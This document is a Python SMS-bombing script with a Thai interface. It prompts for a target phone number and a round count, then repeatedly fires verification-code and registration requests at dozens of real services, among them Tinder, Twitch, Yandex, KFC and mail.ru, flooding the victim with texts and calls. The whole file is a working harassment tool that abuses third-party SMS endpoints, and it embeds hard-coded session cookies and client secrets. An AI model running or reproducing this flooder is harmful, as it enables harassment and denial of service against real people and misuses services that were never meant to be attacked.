# Creator: phoom 99
import requests, random, datetime, sys, time, argparse, os, json
from colorama import Fore, Back, Style


os.system("clear")
colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
W='\033[0m'
c_color = random.choice(colors)
nice = (Fore.YELLOW+Style.BRIGHT+"[+] "+
    Style.RESET_ALL+Fore.GREEN+Style.BRIGHT)
fail = (Fore.YELLOW+Style.BRIGHT+"[-] "+
    Style.RESET_ALL+Fore.RED+Style.BRIGHT)

def check_number():
    if phone:
        try:
            if int(phone) and len(phone) <= 13:
                global _phone
                _phone = phone # +380961114455
                if _phone[0] == '+':
                    _phone = _phone[1:]
                if _phone[0] == '0':
                    _phone = '38' + _phone
                if _phone[0] == '3':
                    _phone = _phone
            else:
                print(Fore.RED+Style.BRIGHT+"หมายเลขที่ป้อนไม่ถูกต้อง!"+Style.RESET_ALL)
                exit()
        except ValueError:
            print(Fore.RED+Style.BRIGHT+"หมายเลขที่ป้อนไม่ถูกต้อง!"+Style.RESET_ALL)
            exit()

def generate_info():
    global _phone9
    global _name
    global _email
    global password
    global username
    global junker_phone
    junker_phone = _phone[2:] 
    _phone9 = '+' +_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email


def start():
    info = Fore.BLUE+Style.BRIGHT+f'\n[เบอร์เป้าหมาย]{phone}\n[จำนวน] {count}'+'\nติดตามช่องกุด้วย\nถ้าจะหยุดให้กดEXIT'+Style.RESET_ALL
    print(info)
    global iteration
    iteration = 0
    while iteration < count:
        try:
            data_frisor={"phone": _phone}
            frisor={
                'Content-type': 'application/json', 
                'Accept': 'application/json, text/plain',
                'authorization': 'Bearer yusw3yeu6hrr4r9j3gw6',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) snap Chromium/81.0.4044.138 Chrome/81.0.4044.138 Safari/537.36',
                'cookie': 'auth=vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; lang=1; yc_vid=97527048909; yc_firstvisit=1589271208; _ym_uid=1589271210161580972; _ym_d=1589271210; _ga=GA1.2.2045789867.1589271211; _gid=GA1.2.807235883.1589271211; _ym_visorc_35239280=b; _ym_isad=2; _gat_gtag_UA_68406331_1=1'
                }
            requests.post("https://n13423.yclients.com/api/v1/book_code/312054", data=json.dumps(data_frisor), headers=frisor)
            # 1 раз в минуту
            print(nice+"DS ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"DS ไม่ส่ง"+Style.RESET_ALL)
        try:
            requests.post("https://kasta.ua/api/v2/login/", data={'phone': _phone})
            print(nice+"GH ทำงาน !"+Style.RESET_ALL)
        except:
            print(fail+"GH ไม่ส่ง"+Style.RESET_ALL)
        try:
            requests.post("https://izi.ua/api/auth/register", json={"phone": _phone9, "name": "Олег", "is_terms_accepted": "true"})
            print(nice+"ZIP ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"ZIP ไม่ส่ง"+Style.RESET_ALL)
        try:
            requests.post("https://junker.kiev.ua/postmaster.php", data={
            'tel': junker_phone,'name': _name,'action':'callme',
            })
            print(nice+"OP ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"OP ไม่ส่ง"+Style.RESET_ALL)
        try:
            requests.post("https://youla.ru/web-api/auth/request_code", data={'phone': _phone})
            print(nice+"QWE ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"QWE ไม่ส่ง"+Style.RESET_ALL)
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print(nice+"Mall ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Mall ไม่ส่ง"+Style.RESET_ALL)
        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            requests.post(f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone9}")
            print(nice+"DATE ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"DATE ไม่ส่ง"+Style.RESET_ALL)
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print(nice+"The ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"The ไม่ส่ง"+Style.RESET_ALL)
        try:
            requests.post("https://crm.getmancar.com.ua/api/veryfyaccount", json={"phone": _phone9,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile",})
            print(nice+"Car ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Car ไม่ส่ง"+Style.RESET_ALL)
        try:
            requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": _phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"})
            print(nice+"ICU ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"ICU ไม่ส่ง"+Style.RESET_ALL)
        try:
            requests.post("https://api.pozichka.ua/v1/registration/send", json={"RegisterSendForm": {"phone": _phone9}})
            print(nice+"hub ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"hub ไม่ส่ง"+Style.RESET_ALL)
        try:
            requests.post(f'https://secure.online.ua/ajax/check_phone/?reg_phone={_phone}')
            print(nice+"See ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"See ไม่ส่ง"+Style.RESET_ALL)
        try:
            requests.post('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{}'.format(_phone))
            print(nice+"Report ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Report ไม่ส่ง"+Style.RESET_ALL)
        try:
            requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper", params={"oper": 9, "callmode": 1, "phone": _phone9})
            print(nice+"Book ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Book ไม่ส่ง"+Style.RESET_ALL)
        try:
            requests.post("https://city24.ua/personalaccount/account/registration", data={"PhoneNumber": _phone},)
            print(nice+"City ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"City ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"},)
            print(nice+"Have ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Have ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + _phone, "api": 2, "email": email})
            print(nice+"Clone ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Clone ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post("https://auth.multiplex.ua/login", json={"login": _phone},)
            print(nice+"Mini ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Mini ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone},)
            print(nice+"Myme ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Myme ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone})
            print(nice+"Do ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Do ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone})
            print(nice+"crash ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"crash ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print(nice+"King ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"King ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': _phone9})
            print(nice+"Like ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Like ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print(nice+"AV ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"AV ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
            print(nice+"Max ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Max ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print(nice+"New ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"New ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://lk.belkacar.ru/register', data={'phone': _phone9})
            print(nice+"Noyou ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Noyou ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
            print(nice+"IT ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"IT ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": _phone})
            requests.post('https://lk.belkacar.ru/get-confirmation-code', data={'phone': _phone9})
            print(nice+"------ ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"------ ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": _phone})
            print(nice+"Online ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Online ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": _phone,"registration": "N"})
            print(nice+"Pro ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Pro ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post("https://mobileplanet.ua/register", data={"klient_name": _name,"klient_phone": "+" + _phone,"klient_email": _email})
            print(nice+"MP4 ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"MP4 ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post( "https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print(nice+"DNA ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"DNA ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://apteka366.ru/login/register/sms/send', data={"phone":_phone})
            print(nice+"App ทำงาน !!"+Style.RESET_ALL)
        except:
            print("App ไม่ส่ง ")
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={"phone":_phone})
            print(nice+"By ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"By ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://drugvokrug.ru/siteActions/processSms.html', data={"cell":_phone})
            print(nice+"Bm ทำงาน !! "+Style.RESET_ALL)
        except:
            print(fail+"Bm ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://api.ennergiia.com/auth/api/development/lor', json={"referrer":"ennergiia", "phone": _phone9})
            print(nice+"DFS ทำงาน!! "+Style.RESET_ALL)
        except:
            print(fail+"DFS ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.get('https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber={}'.format(_phone9))
            print(nice+"Full ทำงาน !! "+Style.RESET_ALL)
        except:
            print(fail+"Full ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://gorzdrav.org/login/register/sms/send', data={"phone": _phone})
            print(nice+"Go ทำงาน !! "+Style.RESET_ALL)
        except:
            print(fail+"Go ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', data={"phone": _phone9})
            print(nice+"FPS ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"FPS ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://api-production.viasat.ru/api/v1/auth_codes', json={"msisdn": _phone9})
            print(nice+"SET ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"SET ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number":_phone})
            print(nice+"Yood ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Yood ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/{}/'.format(_phone9))
            print(nice+"Git ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Git ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={'phone_number': '+' + _phone})
            print(nice+"Ey ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Ey ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
            print(nice+"GC ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"GC ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.get("https://api.eldorado.ua/v1/sign/", params={"login": phone, "step": "phone-check", "fb_id": "null", "fb_token": "null", "lang": "ru",})
            print(nice+"Dora ทำงาน !!"+Style.RESET_ALL)
        except:
            print(fail+"Dora ไม่ส่ง "+Style.RESET_ALL)
        try:
            requests.post("https://shafa.ua/api/v3/graphiql", json={
                "operationName": "RegistrationSendSms",
                "variables": {"phoneNumber": "+" + phone},
                "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
            },)
            print(nice+"ส่ง  SMS!!"+Style.RESET_ALL)
        except:
            print(fail+"ไม่ส่ง SMS"+Style.RESET_ALL)
        iteration += 1
        print(Fore.CYAN+Style.BRIGHT+(f'\n{iteration} ผ่านไป.\n')+Style.RESET_ALL)
    os.system("clear")


def menu():
    global phone
    phone = input(c_color+"ใส่เบอร์ "+W)
    check_number()
    print(Fore.CYAN+Style.BRIGHT+"[ยิงเบอร์] "+Style.RESET_ALL)
    global count
    count = input(c_color+">ใส่จำนวน<"+W)
    count = int(count)
    os.system("clear")
    generate_info()
    banner()
    start()
    banner()
    print(Fore.YELLOW+Style.BRIGHT+f"\nเสร็จสิ้น.\nเบอร์ที่ยิง: {phone}\nจำนวนรอบที่เสร็จสมบูรณ์: {iteration}"+Style.RESET_ALL)






def main():
    banner()
    menu()

main()
